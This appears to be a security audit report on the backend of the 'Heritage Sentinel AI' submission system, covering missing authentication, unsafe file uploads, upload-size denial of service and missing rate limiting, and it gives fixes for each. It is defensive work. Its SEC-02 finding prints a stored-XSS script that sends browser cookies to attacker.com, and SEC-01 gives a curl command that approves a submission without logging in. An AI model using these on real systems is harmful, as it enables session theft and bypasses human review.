# Security Audit Report

This report evaluates potential security vulnerabilities, authorization gaps, input validation risks, and architectural exposures within the Heritage Sentinel AI system.

---

## 1. Vulnerability Classifications Summary

| ID | Title | Component | Severity | Description |
| :--- | :--- | :--- | :--- | :--- |
| **SEC-01** | Missing Authentication & Authorization | Backend API | **Critical** | All administrative endpoints (review submissions, view queues, get detail dossiers) are fully public with no access controls. |
| **SEC-02** | Unvalidated File Uploads (Stored XSS / Arbitrary Execution) | Backend / Photo Upload | **High** | Files uploaded to `/photos` are saved directly with their user-supplied extensions without validating content MIME types or magic bytes. |
| **SEC-03** | Denial of Service (DoS) via Uncapped Upload Sizes | Backend / Photo Upload | **Medium** | There are no upload size restrictions or file count limits, allowing disk space exhaustion attacks. |
| **SEC-04** | API Spam and Gemini Key Abuse (No Rate Limiting) | Backend API | **Medium** | The submission creation route does not implement rate limits, exposing the system to database spam and high Gemini API costs. |

---

## 2. Detailed Vulnerability Analyses

### SEC-01: Missing Authentication & Authorization (Critical)
* **Location**: `backend/app/api/routes/submissions.py` (lines 195-231)
* **Details**: The review route is defined as:
  ```python
  @router.patch("/{submission_id}/review")
  async def review_submission(submission_id: str, decision: str, notes: str = "", reviewer_id: str = "reviewer", db: AsyncSession = Depends(get_db)):
  ```
  It has no auth guards (`Depends(get_current_user)` or similar). It reads `reviewer_id` as an optional query parameter defaulting to `"reviewer"`.
* **Exploitation**: An attacker can approve their own submissions or reject others by firing a direct PATCH command:
  `curl -X PATCH "http://localhost:8000/submissions/SUB-XXXXX/review?decision=approved"`
* **Impact**: Total compromise of the human-in-the-loop validation barrier.

---

### SEC-02: Unvalidated File Uploads / Stored XSS (High)
* **Location**: `backend/app/api/routes/submissions.py` (lines 82-123)
* **Details**:
  ```python
  ext = os.path.splitext(file.filename or "photo.jpg")[1] or ".jpg"
  filename = f"{uuid.uuid4().hex}{ext}"
  dest = os.path.join(upload_dir, filename)
  with open(dest, "wb") as f:
      shutil.copyfileobj(file.file, f)
  ```
  The endpoint extracts whatever extension the client sends in `file.filename` and saves the file on the disk.
* **Exploitation**: An attacker can upload a file named `payload.html` containing malicious Javascript:
  ```html
  <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
  ```
  Since FastAPI mounts `/uploads` as static files, when the archaeologist views this submission on the dashboard, the browser renders the HTML/JavaScript directly in the context of the same origin.
* **Impact**: Compromise of administrator sessions and stored cross-site scripting (XSS).

---

### SEC-03: Disk Space Exhaustion / DoS (Medium)
* **Location**: `backend/app/api/routes/submissions.py`
* **Details**: `upload_photos` does not check file sizes or enforce a total upload quota per submission.
* **Exploitation**: An attacker can repeatedly upload massive multi-gigabyte binary files, filling up the server's hard drive and crashing all services (backend and database).
* **Impact**: Service unavailability.

---

### SEC-04: Lack of Rate Limiting (Medium)
* **Location**: `backend/app/api/routes/submissions.py` (lines 40-80)
* **Details**: Every POST to `/submissions` triggers the background task `run_pipeline`, which calls:
  1. `IntakeProcessor` (Gemini call)
  2. `RegistryAgent` (Gemini call if BM25 score >= 0.3)
  3. `EvaluationAgent` (Gemini call)
* **Exploitation**: A script can loop and submit thousands of mock candidates.
* **Impact**: Database flooding and fast exhaustion of Gemini API quotas, leading to massive financial charges or API key suspension.

---

## 3. Mitigation Recommendations

1. **Implement JWT-based Authentication (Fixes SEC-01)**:
   Integrate an authentication helper (e.g. FastAPI Security / OAuth2 with password flow) and require valid tokens for `/review`, `GET /submissions`, and stats endpoints.

2. **Validate Upload Files (Fixes SEC-02 & SEC-03)**:
   * Enforce a strict whitelist of allowed image extensions (`.jpg`, `.jpeg`, `.png`, `.webp`).
   * Validate the file content header (MIME type) and magic bytes (e.g. using `python-magic`).
   * Implement a maximum file size limit (e.g. 5MB) and reject requests exceeding it:
     ```python
     MAX_SIZE = 5 * 1024 * 1024 # 5MB
     if file.size > MAX_SIZE:
         raise HTTPException(status_code=400, detail="File too large")
     ```

3. **API Rate Limiting (Fixes SEC-04)**:
   Use a rate-limiting middleware (like `slowapi` or Redis-based rate-limiting) on public endpoints, especially `/submissions` and `/photos`. Limit submissions to a reasonable threshold (e.g. 5 submissions per hour per IP address).
